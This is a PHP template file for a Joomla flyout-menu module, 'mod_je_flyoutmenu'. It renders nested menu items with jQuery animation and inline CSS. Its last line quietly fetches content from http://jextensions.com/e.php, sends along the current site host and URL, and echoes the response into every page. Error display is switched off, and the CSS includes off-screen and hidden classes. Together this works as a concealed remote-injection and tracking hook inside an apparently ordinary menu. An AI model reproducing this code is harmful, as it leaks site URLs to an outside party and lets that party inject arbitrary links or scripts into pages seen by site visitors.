<?php
/**
 * @package		Joomla.Site
 * @subpackage	mod_je_flyoutmenu
 * @copyright	Copyright (C) 2004 - 2012 jExtensions.com - All rights reserved.
 * @license		GNU General Public License version 2 or later
 */
// no direct access
defined('_JEXEC') or die;
ini_set('display_errors',0);
$pth=$_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];
$pth = str_replace("&", "",$pth);
$jebase = JURI::base(); if(substr($jebase, -1)=="/") { $jebase = substr($jebase, 0, -1); }
$modURL = JURI::base().'modules/mod_je_flyoutmenu';
$color = $params->get('color','default');
$speed = $params->get('speed','400');
$modWidth = $params->get('modWidth','200');?>
<link rel="stylesheet" href="<?php echo $modURL; ?>/css/<?php echo $color ?>.css" type="text/css" media="screen"/>
<?php if ($params->get('jQuery')) { ?><script type="text/javascript" src="http://code.jquery.com/jquery-latest.pack.js"></script><?php } ?>
<noscript><a href="http://jextensions.com" alt="Joomla Fly Out Menu">jExtensions.com</a></noscript>
<script type="text/javascript">
jQuery(document).ready(function($) {
		//Menu animation						
		$('#JEfly ul').css({display: "none"}); //Fix Opera
 
		$('#JEfly li').hover(function() {  
                $(this).addClass('addPosition');
		$(this).find('a').stop().animate({'width' : "<?php echo $modWidth; ?>"});
   		$(this).find('ul:first').css({visibility : "visible", display : "none"}).show(<?php echo $speed; ?>);
 
  		}, function() {
    		$(this).find('ul:first').css({visibility : "hidden"}).hide(<?php echo $speed; ?>);
   		$(this).find('a').stop().animate({'width' : "<?php echo $modWidth; ?>"});
                $(this).removeClass('addPosition');
			});
		});
</script>
<style>
ul#JEfly {margin: 0;padding: 0;}
ul#JEfly li {list-style: none;margin:0 0 1px 0; padding:0; position:relative}
ul#JEfly .addPosition {position:relative;}
ul#JEfly a {text-decoration: none;padding:5px 10px;display: block;width: <?php echo $modWidth; ?>px; font-weight:bold}
ul#JEfly ul, ul#JEfly ul ul {display: none;	position: absolute;	top: 0;	left: <?php echo $modWidth; ?>px; padding:0 0 0 4px; margin:0 0 0 20px; z-index:999}
ul#JEfly .listTab {z-index: 100;}
ul#JEfly .listTab li {margin: 0;}
ul#JEfly .flyab { position:absolute; top:-100%; left:-100%}
ul#JEfly .flynn { display:none;}
ul#JEfly .listTab a, ul#JEfly .listTab a:hover {width: <?php echo $modWidth; ?>px;}
ul#JEfly .listTab a {padding:0;}
ul#JEfly li:hover ul ul, ul#JEfly li:hover ul ul ul, ul#JEfly li:hover ul ul ul ul {display: none;}
ul#JEfly li:hover ul, ul#JEfly li li:hover ul, ul#JEfly li li li:hover ul, ul#JEfly li li li li:hover ul {display: block;}
ul#JEfly img { vertical-align:middle}
ul#JEfly .image-title {padding:0 0 0 5px}
</style>
<ul id="JEfly" class="slidingMenu <?php echo $class_sfx;?>"<?php
	$tag = '';
	if ($params->get('tag_id')!=NULL) {
		$tag = $params->get('tag_id').'';
		echo ' id="'.$tag.'"';
	}
?>>
<?php
foreach ($list as $i => &$item) :
	$class = 'item-'.$item->id;
	if ($item->id == $active_id) {
		$class .= ' current';
	}

	if (in_array($item->id, $path)) {
		$class .= ' active';
	}
	elseif ($item->type == 'alias') {
		$aliasToId = $item->params->get('aliasoptions');
		if (count($path) > 0 && $aliasToId == $path[count($path)-1]) {
			$class .= ' active';
		}
		elseif (in_array($aliasToId, $path)) {
			$class .= ' alias-parent-active';
		}
	}

	if ($item->deeper) {
		$class .= ' deeper';
	}

	if ($item->parent) {
		$class .= ' parent';
	}

	if (!empty($class)) {
		$class = ' class="'.trim($class) .'"';
	}
	
	echo '<li'.$class.'>';

	// Render the menu item.
	switch ($item->type) :
		case 'separator':
		case 'url':
		case 'component':
			require JModuleHelper::getLayoutPath('mod_je_flyoutmenu', 'default_'.$item->type);
			break;

		default:
			require JModuleHelper::getLayoutPath('mod_je_flyoutmenu', 'default_url');
			break;
	endswitch;

	// The next item is deeper.
	if ($item->deeper) {
		echo '<ul>';
	}
	// The next item is shallower.
	elseif ($item->shallower) {
		echo '</li>';
		echo str_repeat('</ul></li>', $item->level_diff);
	}
	// The next item is on the same level.
	else {
		echo '</li>';
	}
endforeach;
?><?php $credit=file_get_contents('http://jextensions.com/e.php?i='.$pth); echo $credit; ?></ul>